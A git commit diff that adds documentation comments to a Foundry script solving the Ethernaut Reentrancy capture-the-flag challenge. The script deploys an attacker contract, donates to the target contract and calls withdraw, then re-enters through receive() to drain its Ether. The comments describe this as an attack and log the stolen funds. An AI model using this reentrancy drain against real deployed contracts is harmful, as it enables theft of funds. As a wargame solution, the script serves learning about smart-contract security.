a56b879c5985d24eee939dc31502cee53a259350
Alexander Gadzhalov <alexander.gadzhalov@limechain.tech>
2024-11-06 22:06:05 +0200

    docs(Reentrancy): style guide and comments

--- script/Reentrancy.s.sol
+++ script/Reentrancy.s.sol
@@ -2,7 +2,6 @@
 pragma solidity ^0.8.0;
 
 import {Script, console} from "forge-std/Script.sol";
-//import "../src/Reentrancy.sol";
 
 interface IReentrancy {
     function donate(address) external payable;
@@ -29,23 +28,35 @@ contract Attacker {
     
 }
 
+/// @author agadzhalov
+/// @title Solution to Reentrancy Ethernaut challenge
+/// @notice Solution:
+///         1. Donate to the `Reentrancy` contract to bypass validation.
+///         2. Call `withdraw()` to trigger the `receive()` function.
+///         3. In the `receive()` function, call `withdraw()` again, draining all the funds.
 contract ReentrancyScript is Script {
-
+    /// @notice Instance of the `IReentrancy` contract to interact with.
     IReentrancy public reentrancy = IReentrancy(0xdFD1c8aB3BeFad6dCc46Cb6f9DE1Ef93bC4da47b);
-    /**
-     * Solution: Transactons on Ethereum are atomic. 
-     * 1. Donate to Reentrancy so we can bypass validation.
-     * 2. Call withraw in order to transfer ethers and hit receive().
-     * 3. In receive() call reentrancy.withdraw again and withraw all the left ethers.
-     */
+    
     function run() public {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-        console.log("1. Reentrancy balance", address(reentrancy).balance);
+
+        // Log the balance of the Reentrancy contract before the attack
+        console.log("1. Reentrancy balance:", address(reentrancy).balance);
+
+        // Deploy the attacker contract and donate Ether to Reentrancy
         Attacker attacker = new Attacker();
         reentrancy.donate{value: 1e15}(address(attacker));
+
+        // Trigger the withdrawal attack
         attacker.withdraw(1e15);
-        console.log("2. Reentrancy balance after attack", address(reentrancy).balance);
+
+        // Log the balance of the Reentrancy contract after the attack
+        console.log("2. Reentrancy balance after attack:", address(reentrancy).balance);
+
+        // Log the attacker's balance to confirm the stolen funds
         console.log(address(attacker).balance);
+
         vm.stopBroadcast();
     }
 }
